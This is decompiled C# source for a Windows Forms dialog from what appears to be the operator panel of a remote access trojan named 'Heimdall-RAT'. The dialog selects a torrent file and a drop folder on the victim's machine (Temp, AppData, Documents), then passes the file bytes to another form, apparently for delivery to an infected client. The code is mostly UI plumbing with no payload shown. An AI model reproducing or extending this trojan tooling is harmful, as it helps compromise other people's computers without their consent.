using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class Select_Torrent : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("SelTR")]
	private Button _SelTR;

	[AccessedThroughProperty("NextTS")]
	private Button _NextTS;

	[AccessedThroughProperty("TorrFP")]
	private TextBox _TorrFP;

	[AccessedThroughProperty("DroP")]
	private ComboBox _DroP;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	internal virtual Button SelTR
	{
		[DebuggerNonUserCode]
		get
		{
			return _SelTR;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = STF_Click;
			if (_SelTR != null)
			{
				((Control)_SelTR).remove_Click(eventHandler);
			}
			_SelTR = value;
			if (_SelTR != null)
			{
				((Control)_SelTR).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button NextTS
	{
		[DebuggerNonUserCode]
		get
		{
			return _NextTS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = NextF_Click;
			if (_NextTS != null)
			{
				((Control)_NextTS).remove_Click(eventHandler);
			}
			_NextTS = value;
			if (_NextTS != null)
			{
				((Control)_NextTS).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TorrFP
	{
		[DebuggerNonUserCode]
		get
		{
			return _TorrFP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TorrFP = value;
		}
	}

	internal virtual ComboBox DroP
	{
		[DebuggerNonUserCode]
		get
		{
			return _DroP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_DroP = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	[DebuggerNonUserCode]
	public Select_Torrent()
	{
		((Form)this).add_Load((EventHandler)Select_Torrent_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_00f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fc: Expected O, but got Unknown
		//IL_0179: Unknown result type (might be due to invalid IL or missing references)
		//IL_0183: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_02a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b2: Expected O, but got Unknown
		//IL_032c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0336: Expected O, but got Unknown
		//IL_0440: Unknown result type (might be due to invalid IL or missing references)
		//IL_044a: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Select_Torrent));
		SelTR = new Button();
		NextTS = new Button();
		TorrFP = new TextBox();
		DroP = new ComboBox();
		Label1 = new Label();
		Label2 = new Label();
		((Control)this).SuspendLayout();
		((Control)SelTR).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button selTR = SelTR;
		Point location = new Point(372, 10);
		((Control)selTR).set_Location(location);
		((Control)SelTR).set_Name("SelTR");
		Button selTR2 = SelTR;
		Size size = new Size(75, 23);
		((Control)selTR2).set_Size(size);
		((Control)SelTR).set_TabIndex(0);
		((ButtonBase)SelTR).set_Text("Browse");
		((ButtonBase)SelTR).set_UseVisualStyleBackColor(true);
		((Control)NextTS).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button nextTS = NextTS;
		location = new Point(372, 34);
		((Control)nextTS).set_Location(location);
		((Control)NextTS).set_Name("NextTS");
		Button nextTS2 = NextTS;
		size = new Size(75, 23);
		((Control)nextTS2).set_Size(size);
		((Control)NextTS).set_TabIndex(1);
		((ButtonBase)NextTS).set_Text("Next");
		((ButtonBase)NextTS).set_UseVisualStyleBackColor(true);
		((Control)TorrFP).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox torrFP = TorrFP;
		location = new Point(97, 10);
		((Control)torrFP).set_Location(location);
		((Control)TorrFP).set_Name("TorrFP");
		TextBox torrFP2 = TorrFP;
		size = new Size(269, 21);
		((Control)torrFP2).set_Size(size);
		((Control)TorrFP).set_TabIndex(2);
		DroP.set_DropDownStyle((ComboBoxStyle)2);
		((Control)DroP).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)DroP).set_FormattingEnabled(true);
		DroP.get_Items().AddRange(new object[3] { "Temp", "AppData", "Documents" });
		ComboBox droP = DroP;
		location = new Point(97, 34);
		((Control)droP).set_Location(location);
		((Control)DroP).set_Name("DroP");
		ComboBox droP2 = DroP;
		size = new Size(269, 21);
		((Control)droP2).set_Size(size);
		((Control)DroP).set_TabIndex(3);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		location = new Point(10, 13);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(80, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("Torrent File :");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label3 = Label2;
		location = new Point(10, 37);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(81, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("Drop Path   :");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(456, 66);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)DroP);
		((Control)this).get_Controls().Add((Control)(object)TorrFP);
		((Control)this).get_Controls().Add((Control)(object)NextTS);
		((Control)this).get_Controls().Add((Control)(object)SelTR);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Select_Torrent");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Select a Torrent file");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void NextF_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TorrFP.get_Text(), (string)null, false) == 0)
		{
			MessageBox.Show("You must select a torrent file!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		if (!File.Exists(TorrFP.get_Text()))
		{
			MessageBox.Show(TorrFP.get_Text() + "\r\nNot Exists!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		if (Operators.ConditionalCompareObjectEqual(DroP.get_SelectedItem(), (object)null, false))
		{
			MessageBox.Show("You must select path to drop files inside it!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		TSDGR tSDGR = new TSDGR();
		tSDGR.Bytes = File.ReadAllBytes(TorrFP.get_Text());
		tSDGR.FN = SocketServer.Encode(Path.GetFileName(TorrFP.get_Text())).ToString();
		tSDGR.SelectedIndex = DroP.get_SelectedIndex();
		((Control)tSDGR).set_Name("TSF");
		((Control)tSDGR).Show();
		((Form)this).Close();
	}

	private void STF_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_Filter("Torrent File |*.torrent");
		((FileDialog)val).set_Title("Select your torrent file!");
		((CommonDialog)val).ShowDialog();
		if (Operators.CompareString(((FileDialog)val).get_FileName(), (string)null, false) != 0)
		{
			TorrFP.set_Text(((FileDialog)val).get_FileName());
		}
	}

	private void Select_Torrent_Load(object sender, EventArgs e)
	{
	}
}
